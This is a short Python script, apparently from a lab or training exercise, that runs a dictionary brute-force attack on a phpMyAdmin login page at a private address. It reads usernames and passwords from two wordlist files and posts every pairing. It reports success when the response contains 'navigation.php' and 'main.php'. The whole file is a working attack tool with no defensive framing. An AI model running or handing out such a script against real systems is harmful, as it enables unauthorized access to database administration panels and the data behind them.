import requests

def login(url, username, password):
    payload = {'pma_username': username, 'pma_password': password}
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        # Verifica se navigation.php e main.php sono presenti nella risposta
        if "navigation.php" in response.text and "main.php" in response.text:
            return True
    return False

def brute_force_attack(url, username_file, password_file):
    with open(username_file) as users:
        usernames = [line.strip() for line in users]
    with open(password_file) as passwords:
        password_list = [line.strip() for line in passwords]

    for username in usernames:
        for password in password_list:
            print(f"Trying username: {username}, password: {password}")
            if login(url, username, password):
                print(f"Login successful! Username: {username}, Password: {password}")
                return

if __name__ == "__main__":
    url = "http://192.168.50.101/phpMyAdmin/index.php"
    username_file = "usernames.lst"
    password_file = "passwords.lst"
    brute_force_attack(url, username_file, password_file)
